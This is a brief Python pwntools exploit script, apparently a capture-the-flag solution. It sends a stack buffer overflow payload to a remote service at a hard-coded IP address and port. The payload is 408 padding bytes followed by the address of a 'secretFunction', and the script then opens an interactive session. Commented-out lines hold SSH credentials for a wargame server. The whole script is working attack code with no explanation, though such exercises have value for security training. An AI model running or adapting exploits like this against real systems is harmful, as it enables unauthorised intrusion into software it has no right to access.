#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)

# con = process()
#gdb.attach(con, gdbscript = "start")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("34.125.199.248", 4056)

payload = b"a"*408 + p64(elf.sym['secretFunction'])
con.sendlineafter(b"text", payload)

con.interactive()
